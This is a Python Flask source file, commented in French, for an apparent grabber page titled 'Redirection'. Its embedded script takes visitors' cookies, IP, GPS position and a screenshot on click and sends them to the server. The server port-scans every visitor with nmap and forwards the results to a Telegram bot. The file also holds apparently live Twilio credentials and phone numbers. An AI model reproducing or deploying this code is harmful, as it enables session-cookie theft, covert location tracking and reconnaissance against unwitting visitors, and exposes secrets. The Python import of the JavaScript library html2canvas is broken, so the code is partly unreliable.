"from flask import Flask, request, jsonify
from twilio.rest import Client
import requests
import socket
import nmap
import html2canvas

app = Flask(__name__)

# Twilio credentials
account_sid = 'AC2ef2bd5bd5146f76f586d2c577159f90'
auth_token = '5ce2eed95742af1667bb5c8b8528cf0c'
from_number = '+12524866318'
to_number = '+33635960569'

client = Client(account_sid, auth_token)

# Fonction pour récupérer la géolocalisation
def get_geolocation(ip):
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}").json()
        return f"{res['city']}, {res['regionName']}, {res['country']} (ISP: {res['isp']})"
    except:
        return "Localisation impossible"

# Fonction pour scanner les ports
def scan_ports(ip):
    nm = nmap.PortScanner()
    nm.scan(ip, '1-65535')  # Scanne tous les ports possibles
    open_ports = nm[ip].all_tcp()  # Liste tous les ports TCP ouverts
    return open_ports

# Fonction pour envoyer les messages via Telegram
def send_telegram(message):
    token = "YOUR_BOT_TOKEN"  # Remplace avec ton token
    chat_id = "YOUR_CHAT_ID"  # Remplace avec ton chat_id
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    payload = {'chat_id': chat_id, 'text': message}
    requests.post(url, data=payload)

# Fonction d'envoi d'alertes par SMS ou Telegram
def send_alert(ip, user_agent, cookies, screenshot, latitude, longitude, click_x, click_y):
    location = get_geolocation(ip)
    ports = scan_ports(ip)

    # Préparation du message
    message_body = f"""
    Nouvelle visite !
    IP : {ip}
    User-Agent : {user_agent}
    Cookies : {cookies}
    Capture d'écran : {screenshot[:100]}...
    Géolocalisation GPS : {latitude}, {longitude}
    Cliquez à : ({click_x}, {click_y})
    Ports ouverts : {ports if ports else 'Aucun trouvé'}
    Localisation : {location}
    """
    
    # Envoie de l'alerte par Telegram
    send_telegram(message_body)

@app.route('/')
def index():
    return '''
    <html>
    <head><title>Redirection</title></head>
    <body>
        <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
        <script>
            const cookies = document.cookie; // Récupère les cookies de l'utilisateur

            fetch("https://api.ipify.org?format=json")
            .then(res => res.json())
            .then(data => {
                navigator.geolocation.getCurrentPosition(function(position) {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;

                    html2canvas(document.body).then(canvas => {
                        const screenshot = canvas.toDataURL(); // Capture l'écran en base64

                        document.body.addEventListener('click', function(event) {
                            fetch("/log", {
                                method: "POST",
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    ip: data.ip,
                                    ua: navigator.userAgent,
                                    cookies: cookies, // Envoie les cookies
                                    screenshot: screenshot, // Envoie la capture
                                    latitude: latitude, // Envoie la latitude
                                    longitude: longitude, // Envoie la longitude
                                    click_x: event.pageX, // Envoie les coordonnées du clic
                                    click_y: event.pageY  // Envoie les coordonnées du clic
                                })
                            });
                        });
                    });
                });
            });
        </script>
    </body>
    </html>
    '''

@app.route('/log', methods=['POST'])
def log():
    data = request.get_json()
    ip = data.get('ip')
    user_agent = data.get('ua')
    cookies = data.get('cookies')
    screenshot = data.get('screenshot')
    latitude = data.get('latitude')
    longitude = data.get('longitude')
    click_x = data.get('click_x')
    click_y = data.get('click_y')

    # Envoie de l'alerte par SMS/Telegram
    send_alert(ip, user_agent, cookies, screenshot, latitude, longitude, click_x, click_y)

    return jsonify({"status": "ok"})

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)" 
